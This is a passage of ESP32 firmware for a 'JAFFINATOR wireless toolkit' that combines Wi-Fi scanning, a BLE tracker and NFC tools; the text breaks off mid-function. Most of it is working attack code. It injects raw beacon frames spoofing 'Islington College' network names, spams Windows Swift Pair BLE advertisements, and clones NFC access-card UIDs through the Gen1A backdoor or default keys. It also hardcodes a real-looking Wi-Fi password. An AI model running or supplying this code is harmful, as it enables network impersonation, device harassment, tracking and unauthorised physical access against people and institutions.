#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <Wire.h>
#include <Adafruit_PN532.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <ctype.h>

// ===== Wi‑Fi Credentials =====
char ssid[] = "Net";
char pass[] = "af25g+40Nb5wpbu";

// ===== SoftAP Credentials (always available) =====
const char* apSSID = "JaffAP";
const char* apPass = "12345678";

// ===== Hardware =====
#define TFT_CS   15
#define TFT_DC   2
#define TFT_RST  4
#define TFT_MOSI 18
#define TFT_SCK  23
#define PN532_IRQ -1
#define PN532_RST -1

Adafruit_ST7789 tft = Adafruit_ST7789(TFT_CS, TFT_DC, TFT_MOSI, TFT_SCK, TFT_RST);
Adafruit_PN532 nfc(PN532_IRQ, PN532_RST);
WebServer server(80);
DNSServer dnsServer;

bool stopFlag = false;
bool exitFlag = false;
uint32_t pktCount = 0;
uint8_t targetMAC[6] = {0};
int targetChannel = 0;
uint8_t storedUID[7];
uint8_t storedUIDLength = 0;

bool featureRunning = false;
String currentFeature = "";
bool webServerStarted = false;
String webTarget = "";

// ===== Log buffer =====
const int MAX_LOG_LINES = 50;
String logLines[MAX_LOG_LINES];
int logIndex = 0;
int logCount = 0;

// ------------------------------------------------------------
// Clean serial: only important messages are printed.
// Change this to true if you want full debug output again.
#define SERIAL_DEBUG false
// ------------------------------------------------------------
void addLog(String msg) {
  if (SERIAL_DEBUG) Serial.println(msg);
  logLines[logIndex] = msg;
  logIndex = (logIndex + 1) % MAX_LOG_LINES;
  if (logCount < MAX_LOG_LINES) logCount++;
}

// ===== Live data for web =====
String featureDataJson = "{}";

// -------------------- Helpers --------------------
void drawCenteredText(int y, const char* text, uint16_t color, uint8_t size) {
  int16_t x1, y1;
  uint16_t w, h;
  tft.setTextSize(size);
  tft.getTextBounds(text, 0, 0, &x1, &y1, &w, &h);
  int x = (320 - w) / 2;
  tft.setCursor(x, y);
  tft.setTextColor(color);
  tft.print(text);
}

void drawSignalBar(int x, int y, int rssi, uint16_t color) {
  int bars = (rssi > -50) ? 4 : (rssi > -65) ? 3 : (rssi > -80) ? 2 : (rssi > -90) ? 1 : 0;
  tft.fillRect(x, y, 25, 12, ST77XX_BLACK);
  for (int i = 0; i < 4; i++) {
    if (i < bars) tft.fillRect(x + (i * 6), y + (3 - i) * 3, 4, 3, color);
    else tft.drawRect(x + (i * 6), y + (3 - i) * 3, 4, 3, 0x4208);
  }
}

String macToString(uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

// getSafeInput: processes web server while waiting for serial input
String getSafeInput() {
  String input = "";
  while (true) {
    while (Serial.available() > 0) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') {
        input.trim();
        if (input.length() > 0) return input;
        input = "";
      } else input += c;
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    delay(10);
    if (Serial.available() && Serial.peek() == 'm') {
      Serial.read();
      return "m";
    }
  }
}

// ===== Minimal beautiful home screen (TFT) =====
void drawMenu() {
  tft.fillScreen(ST77XX_BLACK);
  for (int i = 0; i < 20; i++) {
    tft.fillCircle(160, 100, 120 - i*5, 0x0200);
  }
  tft.setTextSize(4);
  tft.setTextColor(ST77XX_GREEN);
  drawCenteredText(80, "JAFFINATOR", ST77XX_GREEN, 4);
  tft.setTextSize(2);
  tft.setTextColor(0x7BEF);
  drawCenteredText(150, "wireless toolkit", 0x7BEF, 2);
  tft.setTextSize(1);
  tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(10, 220);
  tft.print("AP: "); tft.print(WiFi.softAPIP());
  if (WiFi.status() == WL_CONNECTED) {
    tft.print("  STA: "); tft.print(WiFi.localIP());
  }
}

// ==================== NFC Magic Card Helpers ====================
bool gen1aUnlock() {
  uint8_t cmd1[] = { 0x40 };
  uint8_t resp[16]; uint8_t respLen = sizeof(resp);
  if (!nfc.inDataExchange(cmd1, 1, resp, &respLen)) return false;
  uint8_t cmd2[] = { 0x43 };
  respLen = sizeof(resp);
  if (!nfc.inDataExchange(cmd2, 1, resp, &respLen)) return false;
  return true;
}

bool gen1aWriteBlock(uint8_t blockNumber, uint8_t *data16) {
  uint8_t cmd[18];
  cmd[0] = 0xA0; cmd[1] = blockNumber;
  memcpy(cmd + 2, data16, 16);
  uint8_t resp[16]; uint8_t respLen = sizeof(resp);
  return nfc.inDataExchange(cmd, 18, resp, &respLen);
}

void buildBlock0(uint8_t *uid4, uint8_t *block0) {
  memset(block0, 0xFF, 16);
  memcpy(block0, uid4, 4);
  block0[4] = uid4[0] ^ uid4[1] ^ uid4[2] ^ uid4[3];
  block0[5] = 0x08;
  block0[6] = 0x04; block0[7] = 0x00;
}

bool writeMagicUID(uint8_t *targetUID, uint8_t targetLen, uint8_t *newUID4) {
  uint8_t block0[16];
  buildBlock0(newUID4, block0);
  if (gen1aUnlock()) {
    if (gen1aWriteBlock(0, block0)) {
      addLog("Write succeeded via Gen1A backdoor");
      return true;
    }
  }
  uint8_t keyA[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t keyB[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
  bool authOK = nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 0, keyA)
             || nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 1, keyB);
  if (!authOK) {
    addLog("writeMagicUID: auth failed");
    return false;
  }
  if (nfc.mifareclassic_WriteDataBlock(0, block0)) {
    addLog("Write succeeded via Gen2/CUID");
    return true;
  }
  addLog("writeMagicUID: write failed");
  return false;
}

bool verifyUID(uint8_t *expectedUID, uint8_t expectedLen) {
  for (int attempt = 0; attempt < 4; attempt++) {
    delay(400);
    uint8_t vUID[7]; uint8_t vLen;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, vUID, &vLen, 1500)) {
      if (vLen == expectedLen) {
        bool match = true;
        for (int i = 0; i < expectedLen; i++) if (vUID[i] != expectedUID[i]) match = false;
        if (match) return true;
      }
    }
  }
  return false;
}

// ==================== Tools ====================
void runWiFiScan() {
  stopFlag = false; exitFlag = false;
  Serial.println("[WiFi Scan] started");
  addLog("WiFi Scan started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_GREEN);
  drawCenteredText(8, "WiFi SCAN", ST77XX_WHITE, 3);
  int totalNetworks = WiFi.scanNetworks();
  Serial.printf("[WiFi Scan] Found %d networks\n", totalNetworks);
  addLog("Found " + String(totalNetworks) + " networks");
  featureDataJson = "{\"type\":\"scan\",\"total\":" + String(totalNetworks) + ",\"networks\":[";
  int maxShow = min(totalNetworks, 6);
  for (int i = 0; i < maxShow; i++) {
    if (i > 0) featureDataJson += ",";
    featureDataJson += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) + ",\"ch\":" + String(WiFi.channel(i)) + "}";
  }
  featureDataJson += "]}";
  tft.fillRect(0, 50, 320, 170, ST77XX_BLACK);
  tft.setCursor(10, 55); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.printf("Total: %d APs", totalNetworks);
  int y = 70;
  for (int i = 0; i < maxShow; i++) {
    String ssid = WiFi.SSID(i);
    if (ssid.length() > 14) ssid = ssid.substring(0, 14) + "..";
    tft.setCursor(10, y); tft.setTextColor(ST77XX_GREEN); tft.printf("[%d]", i+1);
    tft.setCursor(40, y); tft.setTextColor(ST77XX_WHITE); tft.print(ssid);
    tft.setCursor(160, y); tft.printf("CH:%2d %3d dBm", WiFi.channel(i), WiFi.RSSI(i));
    drawSignalBar(260, y, WiFi.RSSI(i), ST77XX_GREEN);
    y += 18;
  }
  tft.setCursor(10, 220); tft.setTextColor(ST77XX_CYAN); tft.print("Waiting... [HOME] to exit");
  while (!stopFlag && !exitFlag) {
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    delay(100);
  }
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[WiFi Scan] exited");
  addLog("WiFi Scan exited");
}

void runWiFiBeacon() {
  stopFlag = false; exitFlag = false;
  Serial.println("[Beacon Spam] started");
  addLog("Beacon Spam started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_RED);
  drawCenteredText(8, "BEACON SPAM", ST77XX_WHITE, 3);
  const char* names[] = {"Islington College","Islingt0n College","Islington Co11ege","Isl1ngton College","Islington C0llege","I5lington College","Isl1ngt0n College"};
  const int numSSIDs = sizeof(names)/sizeof(names[0]);
  unsigned long count = 0;
  while (!stopFlag && !exitFlag) {
    for (int i = 0; i < numSSIDs; i++) {
      uint8_t packet[128];
      int ssidLen = strlen(names[i]);
      memset(packet, 0, sizeof(packet));
      packet[0] = 0x80; packet[1] = 0x00;
      packet[2] = 0x00; packet[3] = 0x00;
      memset(&packet[4], 0xFF, 6);
      packet[10] = 0xAA; packet[11] = 0xBB; packet[12] = 0xCC; packet[13] = 0xDD; packet[14] = 0xEE; packet[15] = 0xE0 + i;
      memcpy(&packet[16], &packet[10], 6);
      packet[22] = 0x00; packet[23] = 0x00;
      uint64_t timestamp = esp_timer_get_time();
      memcpy(&packet[24], &timestamp, 8);
      packet[32] = 0x64; packet[33] = 0x00;
      packet[34] = 0x11; packet[35] = 0x04;
      int pos = 36;
      packet[pos++] = 0x00;
      packet[pos++] = ssidLen;
      memcpy(&packet[pos], names[i], ssidLen);
      pos += ssidLen;
      packet[pos++] = 0x01;
      packet[pos++] = 8;
      uint8_t rates[] = {0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
      memcpy(&packet[pos], rates, 8);
      pos += 8;
      packet[pos++] = 0x03;
      packet[pos++] = 0x01;
      packet[pos++] = 1;
      esp_wifi_80211_tx(WIFI_IF_AP, packet, pos, true);
      delay(2);
      count++;
    }
    if (count % 500 == 0) {
      tft.fillRect(10, 80, 300, 100, ST77XX_BLACK);
      tft.setCursor(10, 90); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3);
      tft.print("Beacons: "); tft.print(count);
      addLog("Beacons sent: " + String(count));
      featureDataJson = "{\"type\":\"beacon\",\"count\":" + String(count) + ",\"ssids\":[";
      for (int i = 0; i < numSSIDs; i++) {
        if (i > 0) featureDataJson += ",";
        featureDataJson += "\"" + String(names[i]) + "\"";
      }
      featureDataJson += "]}";
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 's' || c == 'S') stopFlag = true;
    }
  }
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[Beacon Spam] stopped");
  addLog("Beacon Spam stopped");
}

void runBLEWindowsSpam() {
  stopFlag = false; exitFlag = false;
  Serial.println("[BLE Spam] started");
  addLog("BLE Windows Spam started");
  BLEDevice::init("Jaffinator_Win");
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  BLEAdvertisementData oAdv;
  uint8_t swift[19] = {0x06,0x00,0x03,0x00,0x80,'J','A','F','F','I','N','A','T','O','R',0x00,0x00,0x00,0x00};
  String manData = "";
  for (int i = 0; i < 19; i++) manData += (char)swift[i];
  oAdv.setManufacturerData(manData);
  oAdv.setFlags(0x06);
  pAdv->setAdvertisementData(oAdv);
  pAdv->setScanResponse(false);
  pAdv->setMinInterval(0x20);
  pAdv->setMaxInterval(0x20);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_RED);
  drawCenteredText(8, "BLE WINDOWS SPAM", ST77XX_WHITE, 3);
  tft.setCursor(10, 60); tft.setTextColor(ST77XX_CYAN); tft.print("Cycles:");
  pAdv->start();
  unsigned long count = 0;
  while (!stopFlag && !exitFlag) {
    delay(1000);
    count++;
    tft.fillRect(120, 55, 200, 20, ST77XX_BLACK);
    tft.setCursor(120, 60); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print(count);
    addLog("BLE cycles: " + String(count));
    featureDataJson = "{\"type\":\"ble_spam\",\"cycles\":" + String(count) + ",\"payload\":\"Swift Pair\"}";
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 's' || c == 'S') stopFlag = true;
    }
  }
  pAdv->stop();
  BLEDevice::deinit(false);
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[BLE Spam] stopped");
  addLog("BLE Spam stopped");
}

void runBLETracker() {
  stopFlag = false; exitFlag = false;
  Serial.println("[BLE Tracker] started");
  BLEDevice::init("");
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setActiveScan(true);
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99);
  addLog("BLE Tracker started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_BLUE);
  drawCenteredText(10, "BLE TRACKER", ST77XX_WHITE, 2);
  int scanCount = 0;
  while (!stopFlag && !exitFlag) {
    BLEScanResults* foundDevices = pBLEScan->start(3, false);
    scanCount++;
    tft.fillRect(0, 38, 320, 182, ST77XX_BLACK);
    tft.setCursor(10, 42); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
    tft.printf("Scan #%d  |  %d devices", scanCount, foundDevices->getCount());
    String json = "{\"type\":\"ble_track\",\"scan\":" + String(scanCount) + ",\"devices\":[";
    int maxDev = min((int)foundDevices->getCount(), 6);
    int y = 60;
    for (int i = 0; i < maxDev; i++) {
      BLEAdvertisedDevice d = foundDevices->getDevice(i);
      String name = d.getName().length() > 0 ? d.getName() : "Unknown";
      if (name.length() > 16) name = name.substring(0, 16) + "..";
      tft.setCursor(10, y); tft.setTextColor(ST77XX_WHITE); tft.print(name);
      tft.setCursor(180, y); tft.printf("%d dBm", d.getRSSI());
      drawSignalBar(240, y, d.getRSSI(), d.getRSSI() > -70 ? ST77XX_GREEN : ST77XX_RED);
      if (i > 0) json += ",";
      json += "{\"name\":\"" + name + "\",\"rssi\":" + String(d.getRSSI()) + ",\"mac\":\"" + d.getAddress().toString().c_str() + "\"}";
      y += 24;
    }
    json += "]}";
    featureDataJson = json;
    addLog("BLE scan #" + String(scanCount) + " - " + String(foundDevices->getCount()) + " devices");
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == 's' || c == 'S') stopFlag = true;
    }
  }
  pBLEScan->stop(); BLEDevice::deinit(false);
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[BLE Tracker] stopped");
  addLog("BLE Tracker stopped");
}

void runNFCRead() {
  stopFlag = false; exitFlag = false;
  Serial.println("[NFC Read] started");
  nfc.begin(); nfc.SAMConfig();
  addLog("NFC Read started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 40, ST77XX_RED);
  drawCenteredText(8, "NFC READ", ST77XX_WHITE, 3);
  uint8_t lastUID[7]; uint8_t lastUIDLen = 0; bool cardPresent = false;
  while (!stopFlag && !exitFlag) {
    uint8_t uid[7]; uint8_t uidLen = 0;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLen, 200)) {
      bool sameCard = (cardPresent && uidLen == lastUIDLen && memcmp(uid, lastUID, uidLen) == 0);
      if (!sameCard) {
        memcpy(lastUID, uid, uidLen); lastUIDLen = uidLen; cardPresent = true;
        memcpy(storedUID, uid, uidLen); storedUIDLength = uidLen;
        String uidHex = "";
        for (int i = 0; i < uidLen; i++) {
          if (uid[i] < 0x10) uidHex += "0";
          uidHex += String(uid[i], HEX);
          if (i < uidLen - 1) uidHex += ":";
        }
        uidHex.toUpperCase();
        Serial.printf("[NFC Read] Tag: %s\n", uidHex.c_str());
        addLog("NFC Tag: " + uidHex);
        featureDataJson = "{\"type\":\"nfc\",\"uid\":\"" + uidHex + "\",\"length\":" + String(uidLen) + "}";
        tft.fillRect(0, 50, 320, 190, ST77XX_BLACK);
        tft.setCursor(10, 60); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("TAG DETECTED");
        tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.print("UID: "); tft.print(uidHex);
        tft.setCursor(10, 120); tft.setTextColor(ST77XX_CYAN); tft.print("Len: "); tft.print(uidLen); tft.print(" bytes");
      }
    } else {
      if (cardPresent) {
        cardPresent = false;
        featureDataJson = "{}";
        tft.fillRect(0, 50, 320, 190, ST77XX_BLACK);
        tft.setCursor(10, 60); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Waiting for tag...");
      }
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    if (Serial.available()) {
      char c = toupper(Serial.read());
      if (c == 'S') { stopFlag = true; break; }
    }
    delay(30);
  }
  featureDataJson = "{}";
  tft.fillScreen(ST77XX_BLACK);
  Serial.println("[NFC Read] exited");
  addLog("NFC Read exited");
}

void runNFCClone() {
  stopFlag = false; exitFlag = false;
  Serial.println("[NFC Clone] started");
  nfc.begin(); nfc.SAMConfig();
  addLog("NFC Clone started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x780F);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("STEP 1 of 2");
  tft.fillRect(10, 75, 300, 55, 0x0841);
  tft.drawRect(10, 75, 300, 55, ST77XX_YELLOW);
  tft.setCursor(20, 83); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
  tft.print("Place ORIGINAL / SOURCE card");
  tft.setCursor(20, 97); tft.setTextColor(ST77XX_WHITE); tft.print("on the reader to scan its UID");
  tft.setCursor(20, 113); tft.setTextColor(ST77XX_CYAN); tft.print("Timeout: 10 seconds");
  tft.setCursor(10, 145); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Waiting...");

  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, storedUID, &storedUIDLength, 10000)) {
    addLog("NFC Clone: Timeout - no source card");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(60, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("TIMEOUT!");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("No source tag detected.");
    delay(2000);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[NFC Clone] failed (no source)");
    return;
  }
  String uidStr = "";
  for (int i = 0; i < storedUIDLength; i++) {
    if (storedUID[i] < 0x10) uidStr += "0";
    uidStr += String(storedUID[i], HEX);
    if (i < storedUIDLength - 1) uidStr += ":";
  }
  Serial.printf("[NFC Clone] Source UID: %s\n", uidStr.c_str());
  addLog("Source UID: " + uidStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x780F);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
  tft.fillRect(0, 45, 320, 20, 0x0380);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("STEP 1 DONE  |  Source UID captured!");
  tft.setCursor(10, 75); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Source UID:");
  tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(uidStr);
  tft.fillRect(0, 115, 320, 12, 0x1082);
  tft.setCursor(10, 117); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print(storedUIDLength * 8); tft.print("-bit  |  ISO14443A");
  tft.drawRect(10, 135, 300, 60, ST77XX_CYAN);
  tft.setCursor(20, 143); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1);
  tft.print("STEP 2: Place MAGIC / GEN2 card");
  tft.setCursor(20, 157); tft.setTextColor(ST77XX_WHITE); tft.print("Remove source card, then");
  tft.setCursor(20, 171); tft.print("place the writable target card.");
  tft.setCursor(20, 185); tft.setTextColor(ST77XX_YELLOW);
  for (int c = 3; c >= 1; c--) {
    tft.fillRect(0, 205, 320, 20, ST77XX_BLACK);
    tft.setCursor(10, 207); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1);
    tft.print("Reading in "); tft.print(c); tft.print("...");
    delay(1000);
  }
  tft.fillRect(0, 200, 320, 40, ST77XX_BLACK);
  tft.setCursor(10, 205); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("Scanning...");
  uint8_t tUID[7]; uint8_t tLen;
  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tUID, &tLen, 10000)) {
    addLog("NFC Clone: No target card");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(30, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("NO CARD!");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("No target card detected.");
    delay(2000);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[NFC Clone] failed (no target)");
    return;
  }
  String tStr = "";
  for (int i = 0; i < tLen; i++) {
    if (tUID[i] < 0x10) tStr += "0"; tStr += String(tUID[i], HEX);
    if (i < tLen - 1) tStr += ":";
  }
  addLog("Target UID: " + tStr);
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x780F);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("STEP 2  |  Writing to target...");
  tft.setCursor(10, 78); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Source UID:"); tft.setCursor(10, 90); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print(uidStr);
  tft.setCursor(10, 108); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Target UID:"); tft.setCursor(10, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print(tStr);

  if (storedUIDLength != 4) {
    addLog("NFC Clone: source UID not 4 bytes");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 90, 260, 60, 0x2000); tft.drawRect(30, 90, 260, 60, ST77XX_RED);
    tft.setCursor(40, 103); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("UNSUPPORTED");
    tft.setCursor(30, 130); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Only 4-byte UID source cards");
    tft.setCursor(30, 143); tft.print("can be cloned.");
    delay(2500);
    tft.fillScreen(ST77XX_BLACK);
    Serial.println("[NFC Clone] failed (unsupported UID length)");
    return;
  }

  bool wrote = writeMagicUID(tUID, tLen, storedUID);
  if (wrote) {
    bool verified = verifyUID(storedUID, storedUIDLength);
    if (verified) {
      addLog("Clone SUCCESS! UID: " + uidStr);
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x780F);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
      tft.fillRect(0, 45, 320, 20, 0x0380);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("COMPLETE  |  UID matched & verified");
      tft.fillRect(30, 80, 260, 50, 0x0200); tft.drawRect(30, 80, 260, 50, ST77XX_GREEN);
      tft.setCursor(70, 92); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3); tft.print("SUCCESS");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Written UID:"); tft.setCursor(10, 158); tft.setTextColor(ST77XX_WHITE); tft.print(uidStr);
      featureDataJson = "{\"type\":\"nfc_clone\",\"status\":\"success\",\"uid\":\"" + uidStr + "\"}";
      Serial.printf("[NFC Clone] success: %s\n", uidStr.c_str());
    } else {
      addLog("Clone write done but verify inconclusive");
      tft.fillScreen(ST77XX_BLACK);
      tft.fillRect(0, 0, 320, 45, 0x780F);
      tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
      tft.fillRect(0, 45, 320, 20, 0x2000);
      tft.setCursor(10, 50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Written, but verify inconclusive");
      tft.fillRect(30, 80, 260, 50, 0x2000); tft.drawRect(30, 80, 260, 50, ST77XX_RED);
      tft.setCursor(25, 92); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("RECHECK");
      tft.setCursor(10, 145); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Remove card, re-tap to confirm.");
      featureDataJson = "{\"type\":\"nfc_clone\",\"status\":\"verify_fail\",\"uid\":\"" + uidStr + "\"}";
      Serial.println("[NFC Clone] verify inconclusive");
    }
  } else {
    addLog("NFC Clone: Write failed");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
    tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[NFC CLONE]");
    tft.fillRect(30, 80, 260, 65, 0x2000); tft.drawRect(30, 80, 260, 65, ST77XX_RED);
    tft.setCursor(30, 93); tft.setTextColor(ST77XX_RED); tft.setTextSize(2); tft.print("WRITE FAIL");
    tft.setCursor(30, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(1); tft.print("Not a writable card.");
    featureDataJson = "{\"type\":\"nfc_clone\",\"status\":\"write_fail\"}";
    Serial.println("[NFC Clone] write failed");
  }
  delay(3000);
  tft.fillScreen(ST77XX_BLACK);
}

void runManualUIDUpdate() {
  stopFlag = false; exitFlag = false;
  Serial.println("[Manual UID] started");
  nfc.begin(); nfc.SAMConfig();
  addLog("Manual UID started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 45, 0x03EF);
  tft.setCursor(10, 8); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(3); tft.print("[MAN. UID]");
  tft.fillRect(0, 45, 320, 20, 0x1082);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Mode 71  |  Manual UID Write");
  tft.drawRect(10, 75, 300, 80, ST77XX_CYAN);
  tft.setCursor(20, 83); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Type UID in Serial Monitor");
  tft.setCursor(20, 97); tft.setTextColor(ST77XX_WHITE); tft.print("Format:  DE AD BE EF");
  tft.setCursor(20, 111); tft.print("     or: DE:AD:BE:EF");
  tft.setCursor(20, 125); tft.print("     or: DEADBEEF");
  tft.fillRect(10, 165, 300, 30, 0x1082);
  tft.drawRect(10, 165, 300, 30, ST77XX_YELLOW);
  tft.setCursor(20, 173); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Waiting for Serial input... 's'=stop 'm'=menu");
  bool blink = false;
  tft.setCursor(10, 205); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(2); tft.print("> ");
  Serial.println("\n[Manual UID] Enter UID as hex (space, colon, or no separator).");
  Serial.println("Example: DE AD BE EF   or   DE:AD:BE:EF   or   DEADBEEF");
  Serial.print("> ");
  String input = "";
  unsigned long lastBlink = millis();
  while (true) {
    if (millis() - lastBlink > 400) {
      blink = !blink;
      tft.fillRect(26, 205, 12, 18, ST77XX_BLACK);
      tft.setCursor(26, 205); tft.setTextColor(blink ? ST77XX_GREEN : ST77XX_BLACK); tft.setTextSize(2); tft.print("_");
      lastBlink = millis();
    }
    if (Serial.available()) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') { if (input.length() > 0) break; }
      else { input += c; Serial.print(c); }
    }
    if (Serial.peek() == 's' || Serial.peek() == 'm') {
      Serial.read();
      addLog("Manual UID cancelled");
      tft.fillScreen(ST77XX_BLACK);
      tft.setCursor(10, 120); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(2); tft.print("Cancelled");
      delay(1000);
      tft.fillScreen(ST77XX_BLACK);
      Serial.println("[Manual UID] cancelled");
      return;
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    delay(10);
  }
  input.trim();
  if (input.length() == 0) {
    addLog("Manual UID: No input");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 45, ST77XX_RED);
